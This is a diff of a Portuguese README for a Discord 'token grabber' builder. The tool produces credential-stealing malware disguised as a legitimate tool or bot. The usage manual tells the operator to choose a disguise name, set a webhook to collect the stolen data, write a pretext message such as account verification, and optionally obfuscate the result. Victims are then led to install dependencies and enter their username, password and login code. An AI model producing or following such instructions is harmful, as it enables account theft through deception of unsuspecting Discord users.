@@ -1,32 +1,29 @@
-APRESENTAÇÃO:
-Bem-vindo ao C.G.T.D.T. — CARNIÇA GAMBER TOKEN DISCORD TOOL
-uma ferramenta que gera um gamber de tokens para discord se passando por uma ferramenta ou bot original 
-criado por LORDE COTIZEIRA E PUPUTINET
-ele foi criado dia 30/09/2026 
-desenvolvido em python
+Bem-vindo ao C.G.T.D.T. — CARNIÇA GRABBER TOKEN DISCORD TOOL
+uma ferramenta que gera um grabber de tokens para discord se passando por uma ferramenta legitima.
 
-SERVIDORES DONOS: 
-CARNIÇAL TEAM = LORDE COTIZEIRA
-RED DRAGON = PUPUTINET
+criado por: LORDE COTIZEIRA E PUPUTINET
+data de criação: 30/09/2026 
+tecnologia usada: Python
 
-
+SERVIDORES: 
+CARNIÇAL TEAM = LORDE COTIZEIRA;
+RED DRAGON = PUPUTINET.
 
 
 
 MANUAL DE USO:
-você ira iniciar e colocar a opção [1] após isso você ira colocar o nome da ferramenta que você ira usar como disfarce [fica da sua preferencia] após isso você ira colocar o webhook que ira chegar as informações 
-mensagem = as mensagens que ira aparecer exemplo( para verificamos sua conta  ou sla)
+você inicia e coloca a opção [1] após isso você coloca o nome da ferramenta que você ira usar como disfarce [sua preferencia] após isso você deve colocar o webhook que vai chegar as informações.
+mensagem = as mensagens que vão aparecer exemplo( para verificamos sua conta etc).
+após isso você coloca o nome da ferramenta, e usa o criptografador(caso queira não usar).
 
-após isso você coloca o nome da ferramenta e pronto
-após isso você usa o criptografador e pronto (caso queira não usar tbm serve)
 
-ai você faz ele instalar
 
+ELE DEVE USAR:
 pip install requests
 pip install discord
 
-APOS ISSO ELE COLOCA O NOME EA SENHA [SE TIVE UM CODIGO ELE COLOCA] E PRONTO
-USSE SUA CRIATIVIDADE
+APOS ISSO ELE COLOCA O NOME E A SENHA [SE TIVER UM CODIGO ELE COLOCA].
+!USE SUA CRIATIVIDADE!
 
 
 
